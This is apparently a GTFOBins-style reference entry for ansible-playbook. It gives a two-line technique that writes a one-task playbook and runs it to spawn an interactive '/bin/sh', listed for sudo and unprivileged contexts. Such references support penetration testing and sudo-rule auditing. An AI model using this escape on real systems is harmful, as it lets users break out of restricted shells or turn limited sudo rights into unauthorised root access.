title: ansible-playbook
html:
ansible-playbook

Shell

Context: sudo, unprivileged

echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >/path/to/temp-file
ansible-playbook /path/to/temp-file
excerpt: ansible-playbook Shell Context: sudo, unprivileged echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >/path/to/temp-file ansible-playbook /path/
